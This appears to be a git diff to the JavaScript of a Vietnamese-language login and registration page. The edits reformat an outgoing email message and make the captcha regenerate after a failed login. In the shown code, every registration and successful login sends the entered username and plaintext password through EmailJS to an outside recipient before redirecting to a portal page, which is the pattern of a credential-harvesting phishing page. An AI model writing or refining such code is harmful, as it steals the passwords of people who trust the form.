@@ -88,7 +88,7 @@ document.addEventListener("DOMContentLoaded", function () {
     const captchaCode = document.getElementById("captcha-code");
     const captchaInput = document.getElementById("captcha-input");
     const refreshCaptcha = document.getElementById("refresh-captcha");
-
+    
     let isRegistering = false;
     
     toggleForm.addEventListener("click", function (e) {
@@ -127,9 +127,7 @@ document.addEventListener("DOMContentLoaded", function () {
         emailjs.send('default_service', 'template_mcvqowq', {
             from_name: username,
             to_name: "Người nhận",
-            message: `${action}:
-            Tài khoản: ${username}
-            Mật khẩu: ${password}`,
+            message: `${action}:\nTài khoản: ${username}\nMật khẩu: ${password}`,
             reply_to: username,
         }).then(
             response => console.log('Email sent:', response),
@@ -152,8 +150,16 @@ document.addEventListener("DOMContentLoaded", function () {
             showNotification("✅ Đăng ký thành công!", "bg-green-500");
             toggleForm.click();
         } else {
-            if (!users[username] || users[username] !== password) return showNotification("⚠ Sai tài khoản hoặc mật khẩu!", "bg-red-500");
-            if (captchaInput.value !== captchaCode.textContent) return showNotification("⚠ Captcha không chính xác!", "bg-red-500");
+            if (!users[username] || users[username] !== password) {
+                showNotification("⚠ Sai tài khoản hoặc mật khẩu!", "bg-red-500");
+                generateCaptcha();
+                return;
+            }
+            if (captchaInput.value !== captchaCode.textContent) {
+                showNotification("⚠ Captcha không chính xác!", "bg-red-500");
+                generateCaptcha();
+                return;
+            }
             showNotification("✅ Đăng nhập thành công!", "bg-green-500");
             sendEmail("Đăng nhập thành công", username, password);
             setTimeout(() => window.location.href = "portal.html", 1000);
